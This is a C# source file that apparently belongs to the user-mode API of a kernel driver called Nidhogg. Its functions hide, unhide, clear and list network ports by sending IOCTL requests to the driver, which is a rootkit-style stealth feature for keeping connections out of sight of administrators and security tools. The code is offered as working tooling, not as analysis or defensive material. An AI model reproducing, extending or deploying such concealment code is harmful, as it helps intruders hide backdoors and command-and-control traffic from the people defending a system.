using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static NidhoggCSharpApi.NidhoggApi;

namespace NidhoggCSharpApi
{
    internal partial class NidhoggApi
    {
        private NidhoggErrorCodes PortHiding(ushort port, bool remote, PortType portType, bool hide)
        {
            InputHiddenPort hiddenPort;

            hiddenPort = new InputHiddenPort
            {
                Hide = hide,
                Port = port,
                Remote = remote,
                Type = portType
            };

            return NidhoggSendDataIoctl(hiddenPort, IOCTL_HIDE_UNHIDE_PORT);
        }

        public NidhoggErrorCodes HidePort(ushort port, bool remote, PortType portType)
        {
            return PortHiding(port, remote, portType, true);
        }

        public NidhoggErrorCodes UnhidePort(ushort port, bool remote, PortType portType)
        {
            return PortHiding(port, remote, portType, false);
        }

        public NidhoggErrorCodes ClearAllHiddenPorts()
        {
            if (!DeviceIoControl(this.hNidhogg, IOCTL_CLEAR_HIDDEN_PORTS,
                IntPtr.Zero, 0, IntPtr.Zero, 0, out uint _, IntPtr.Zero))
                return NidhoggErrorCodes.NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

            return NidhoggErrorCodes.NIDHOGG_SUCCESS;
        }

        public HiddenPort[] QueryHiddenPorts()
        {
            HiddenPort[] hiddenPorts;
            OutputHiddenPorts outHiddenPorts;
            outHiddenPorts = new OutputHiddenPorts();

            outHiddenPorts = NidhoggRecieveDataIoctl(outHiddenPorts, IOCTL_QUERY_HIDDEN_PORTS);

            if (outHiddenPorts.PortsCount == 0)
                return null;
            hiddenPorts = new HiddenPort[outHiddenPorts.PortsCount];

            for (int i = 0; i < outHiddenPorts.PortsCount; i++)
            {
                hiddenPorts[i] = outHiddenPorts.Ports[i];
            }

            return hiddenPorts;
        }
    }
}